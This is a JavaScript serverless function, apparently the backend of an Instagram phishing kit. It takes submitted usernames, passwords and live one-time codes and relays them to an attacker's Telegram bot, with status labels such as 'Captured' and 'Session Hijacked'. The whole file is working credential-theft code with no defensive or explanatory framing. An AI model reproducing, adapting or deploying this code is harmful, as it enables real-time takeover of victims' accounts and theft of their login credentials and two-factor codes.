// Vercel Serverless Function for Telegram Integration
export default async function handler(req, res) {
    // Sirf POST requests allow karein
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    try {
        const { type, user, pass, otp, attempts } = req.body;
        
        // Vercel Environment Variables se data uthana
        const BOT_TOKEN = process.env.BOT_TOKEN;
        const CHAT_ID = process.env.CHAT_ID;

        if (!BOT_TOKEN || !CHAT_ID) {
            console.error("Missing Environment Variables: BOT_TOKEN or CHAT_ID");
            return res.status(500).json({ error: "Backend Configuration Error" });
        }

        // Telegram Message Format
        let message = `🚀 **New Instagram Hit!**\n\n`;
        message += `👤 **Username:** \`${user}\`\n`;
        
        if (type === 'auth') {
            message += `🔑 **Password:** \`${pass}\`\n`;
            message += `📊 **Attempt:** ${attempts}\n`;
            message += `🛠️ **Status:** ${attempts === 1 ? 'Captured (Initial)' : 'Verified (Second Entry)'}`;
        } else if (type === 'otp') {
            message += `🔢 **Live OTP:** \`${otp}\`\n`;
            message += `✅ **Status:** Session Hijacked`;
        }

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (response.ok) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(500).json({ error: "Failed to send to Telegram" });
        }

    } catch (error) {
        console.error("Server Error:", error);
        return res.status(500).json({ error: "Internal Server Error" });
    }
              }
          
